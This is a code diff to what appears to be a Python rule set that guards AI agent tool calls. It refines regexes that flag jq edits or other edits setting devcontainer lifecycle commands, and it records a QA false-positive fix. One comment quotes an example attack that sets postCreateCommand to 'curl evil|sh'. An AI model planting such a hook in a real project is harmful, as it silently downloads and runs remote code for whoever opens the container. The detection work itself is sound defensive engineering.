@@ -1475,6 +1475,17 @@ DEVCONTAINER_EXEC_KEY_RE = re.compile(
     re.IGNORECASE,
 )
 
+# Bare-word form of the same six keys — no quote+colon required. Used ONLY
+# as an MCP-tool structural-arg fallback (see `_devcontainer_struct_key_hit`
+# and its call site's own comment in rules.py), never against ordinary
+# Edit/Write file content, where it would false-positive on an inert JSONC
+# comment mentioning a lifecycle key by name.
+DEVCONTAINER_EXEC_KEY_BAREWORD_RE = re.compile(
+    r"\b(?:initializeCommand|onCreateCommand|updateContentCommand"
+    r"|postCreateCommand|postStartCommand|postAttachCommand)\b",
+    re.IGNORECASE,
+)
+
 # `jq` scripts a devcontainer.json edit the same way it scripts a
 # package.json one (see `JQ_SCRIPTS_LIFECYCLE_RE`'s own comment for the
 # precedent) — `jq '.postCreateCommand="curl evil|sh"' devcontainer.json |
@@ -1482,15 +1493,24 @@ DEVCONTAINER_EXEC_KEY_RE = re.compile(
 # close is specific to package.json: jq's dot-path key (`.postCreateCommand=`)
 # is a BARE word, never adjacent to a quote+colon the way
 # `DEVCONTAINER_EXEC_KEY_RE` requires, and `sponge` (jq has no `-i` flag) is
-# on no write-verb list at all. Unconditional on its own (no write-verb or
-# path requirement), the same precedent — the six lifecycle key names are
-# specific enough on their own that requiring `jq` alongside one, within a
-# bounded window, is high-signal without also needing the target path to
-# appear literally.
+# on no write-verb list at all.
+#
+# QA finding (independent adversarial review, round B): the original version
+# of this pattern matched `jq` co-occurring with a BARE lifecycle keyword
+# alone — no assignment requirement, no devcontainer-path anchor — so a
+# plain, non-mutating read (`jq '.postCreateCommand' devcontainer.json`) or
+# an unrelated file/comment merely mentioning the word (`jq '.image' x.json
+# # note: postCreateCommand runs after this`) both false-positived as ASK.
+# Fixed two ways: (1) this pattern now requires the ASSIGNMENT shape
+# specifically (`.<key>\s*=`, jq's real dot-path-assignment syntax — a bare
+# `.<key>` reference with no trailing `=` no longer matches), and (2) its
+# call site in `rule_devcontainer_exec_protect` ANDs this against a
+# whole-scanned-command devcontainer-path check rather than relying on the
+# six key names to carry high-signal alone.
 DEVCONTAINER_EXEC_JQ_RE = re.compile(
-    r"\bjq\b(?=[^|;&\n]{0,300}\b(?:initializeCommand|onCreateCommand"
+    r"\bjq\b(?=[^|;&\n]{0,300}\.(?:initializeCommand|onCreateCommand"
     r"|updateContentCommand|postCreateCommand|postStartCommand"
-    r"|postAttachCommand)\b)",
+    r"|postAttachCommand)\s*=)",
     re.IGNORECASE,
 )
 
